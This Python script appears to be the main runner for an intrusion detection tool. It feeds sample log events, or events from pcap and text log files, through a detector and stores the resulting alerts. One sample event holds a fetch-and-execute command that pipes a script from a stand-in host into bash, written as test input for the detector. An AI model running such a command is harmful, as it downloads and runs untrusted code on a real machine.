import sys
import time
from pathlib import Path

from app.schemas import LogEvent
from app.detector import IDSDetector
from app.storage import init_db, store_alert
from app.dataloader import load_pcap_events, load_text_log_events


def run_sample_mode(detector: IDSDetector) -> None:
    sample_events = [
        LogEvent(time.time(), "192.168.1.50", "server1", "ssh", "Failed password for invalid user admin"),
        LogEvent(time.time(), "10.0.0.15", "server2", "web", "curl http://evil.example/payload.sh | bash -i"),
        LogEvent(time.time(), "127.0.0.1", "server3", "cron", "trusted_update completed successfully")
    ]

    for event in sample_events:
        result = detector.predict_event(event)
        print(result)

        if result.predicted_label != "benign" and not result.deduplicated:
            store_alert(result)


def run_file_mode(detector: IDSDetector, input_path: str) -> None:
    path = Path(input_path)

    if not path.exists():
        raise FileNotFoundError(f"Input path not found: {input_path}")

    suffix = path.suffix.lower()

    if suffix in {".pcap", ".pcapng"}:
        events = load_pcap_events(path)
    elif suffix in {".log", ".txt"}:
        events = load_text_log_events(path)
    else:
        raise ValueError("Detection input must be a .pcap, .pcapng, .log, or .txt file.")

    print(f"Loaded {len(events)} events from {path}")

    for event in events:
        result = detector.predict_event(event)
        print(result)

        if result.predicted_label != "benign" and not result.deduplicated:
            store_alert(result)


def main() -> None:
    init_db()
    detector = IDSDetector()

    if len(sys.argv) > 1:
        run_file_mode(detector, sys.argv[1])
    else:
        run_sample_mode(detector)


if __name__ == "__main__":
    main()